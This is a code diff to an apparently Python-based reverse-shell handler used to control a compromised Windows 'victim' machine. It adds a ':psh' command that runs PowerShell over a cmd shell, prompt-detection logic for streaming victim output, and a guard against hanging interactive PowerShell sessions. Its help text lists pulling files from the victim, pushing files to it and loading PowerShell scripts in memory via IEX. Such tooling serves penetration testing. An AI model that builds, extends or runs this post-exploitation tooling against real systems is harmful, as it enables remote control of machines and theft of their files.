@@ -471,6 +471,9 @@ def raw_interact(manager, channel, reason=None):
                 "local commands:\n"
                 "  :download <remote> [local]   pull a file from the victim\n"
                 "  :upload   <local> [remote]   push a file to the victim\n"
+                "  :psh      <command>          run a PowerShell command (works\n"
+                "                               from a cmd shell; bare 'powershell'\n"
+                "                               hangs over a pipe -- use this)\n"
                 "  :load     <local.ps1>        load a PS script in-memory (IEX)\n"
                 "  :run      <local.ps1> [cmd]  load it, then run [cmd] (e.g. a\n"
                 "                               function it defines) and show output\n"
@@ -500,6 +503,23 @@ def raw_interact(manager, channel, reason=None):
             remote = args[1] if len(args) > 1 else os.path.basename(local)
             _upload(local, remote)
             return "reuse"
+        if cmd in ("psh", "ps"):
+            if len(line.split(None, 1)) < 2:
+                console.log("usage: :psh <powershell command>")
+                return "reuse"
+            pscmd = line.split(None, 1)[1]
+            if shell_kind["value"] == "powershell":
+                wire = pscmd
+            else:
+                # From cmd.exe: run a one-shot PowerShell that flushes its
+                # output on exit (a bare interactive `powershell` over a pipe
+                # buffers forever and never returns output).
+                wire = 'powershell -NoProfile -Command "' + pscmd.replace('"', '\\"') + '"'
+            try:
+                channel.send((wire + "\n").encode("utf-8", "replace"))
+            except ChannelClosed:
+                return "reuse"
+            return "read"
         if cmd in ("load", "source"):
             if not args:
                 console.log("usage: :load <local-script.ps1>")
@@ -517,17 +537,39 @@ def raw_interact(manager, channel, reason=None):
         console.log(f"unknown local command: :{cmd} (try :help)")
         return "reuse"
 
-    def read_response(first_timeout: float = 30.0, idle: float = 0.4):
+    def _looks_like_prompt(buf: bytes) -> bool:
+        """Heuristic: does the held-back tail look like a shell prompt? Covers
+        cmd (``C:\\...>``), PowerShell (``PS C:\\...>``) and POSIX (``$``/``#``)."""
+        t = buf.rstrip()
+        return bool(t) and t[-1:] in (b">", b"$", b"#", b"%")
+
+    def read_response(
+        first_timeout: float = 30.0,
+        prompt_idle: float = 0.35,
+        busy_idle: float = 2.5,
+    ):
         """Stream victim output to our stdout, holding back the trailing
-        (unterminated) line which is almost always the next prompt. Waits up to
-        ``first_timeout`` for the command to start responding, then drains until
-        output has been idle for ``idle`` seconds. Returns (prompt, closed)."""
+        (unterminated) line which is normally the next prompt. Returns
+        (prompt, closed).
+
+        The idle wait is adaptive: once the held-back tail already looks like a
+        prompt we return quickly (``prompt_idle``); if it does NOT look like a
+        prompt we wait much longer (``busy_idle``) because output is probably
+        still coming -- e.g. a slow command, a high-latency host, or a sub-shell
+        (``powershell``) taking seconds to start. This stops us from returning a
+        bogus prompt mid-operation and eating the operator's next keystrokes."""
 
         tail = getattr(channel, "peek_buffer", b"") or b""
         if tail:
             channel.peek_buffer = b""
-        timeout = idle if tail else first_timeout
+        got_data = bool(tail)
         while True:
+            if not got_data:
+                timeout = first_timeout
+            elif _looks_like_prompt(tail):
+                timeout = prompt_idle
+            else:
+                timeout = busy_idle
             try:
                 ready, _, _ = select.select([sock_fd], [], [], timeout)
             except InterruptedError:
@@ -540,13 +582,13 @@ def raw_interact(manager, channel, reason=None):
                 return tail, True
             if not data:
                 return tail, True
+            got_data = True
             tail += data
             nl = tail.rfind(b"\n")
             if nl >= 0:
                 sys.stdout.buffer.write(tail[: nl + 1])
                 sys.stdout.buffer.flush()
                 tail = tail[nl + 1 :]
-            timeout = idle
 
     # Nudge silent shells (e.g. Nishang loops) so we get an initial prompt --
     # unless detection already elicited one (left in peek_buffer).
@@ -624,6 +666,26 @@ def raw_interact(manager, channel, reason=None):
                     continue
             except EOFError:
                 break
+
+            # Guard the footgun: a bare interactive PowerShell launched over a
+            # pipe buffers its output forever and shows no prompt, hanging the
+            # session (plain nc does the same -- it's PowerShell's redirected-IO
+            # behavior, not something we can fix by sending it). Warn and don't
+            # send; point at :psh, which runs PowerShell commands that work.
+            if line.strip().lower() in (
+                "powershell", "powershell.exe", "pwsh", "pwsh.exe",
+            ):
+                console.log(
+                    "[yellow]heads up[/yellow]: a bare interactive "
+                    f"[cyan]{line.strip()}[/cyan] over a pipe hangs -- it buffers "
+                    "output and shows no prompt (nc behaves the same). Not sent.\n"
+                    "  * run PowerShell commands with [cyan]:psh <command>[/cyan]\n"
+                    "  * load scripts in-memory with [cyan]:load[/cyan] / [cyan]:run[/cyan]\n"
+                    "  * for a full interactive PowerShell, catch a PowerShell "
+                    "reverse shell directly",
+                )
+                reuse_prompt = True
+                continue
 
             try:
                 channel.send(line.encode("utf-8", "replace") + b"\n")
